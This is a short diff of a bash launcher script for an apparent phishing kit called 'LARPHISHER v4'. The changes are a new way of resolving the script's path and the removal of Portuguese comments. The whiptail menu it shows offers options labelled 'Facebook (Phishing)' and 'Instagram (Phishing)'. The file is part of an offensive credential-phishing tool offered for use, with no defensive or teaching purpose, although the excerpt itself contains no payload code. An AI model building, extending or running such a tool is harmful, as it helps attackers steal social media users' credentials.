@@ -1,8 +1,7 @@
 #!/bin/bash
-R="$(cd "$(dirname "$0")" && pwd)"
+R="$(dirname "$(readlink -f "$0")")"
 AUTH="$R/auth"
 
-# Cores corrigidas: Removido o backtitle para matar o azul
 export NEWT_COLORS='
 root=white,black
 window=white,black
@@ -23,7 +22,6 @@ trap 'clear; exit 0' INT
 
 while true; do
     clear
-    # Título agora carrega a assinatura by-01png
     CHOICE=$(whiptail --title " LARPHISHER v4 | by-01png " --menu "Setas ↑ ↓ p/ navegar | Enter p/ escolher:" 25 70 18 \
     "01" "Facebook (Phishing)" \
     "02" "Instagram (Phishing)" \
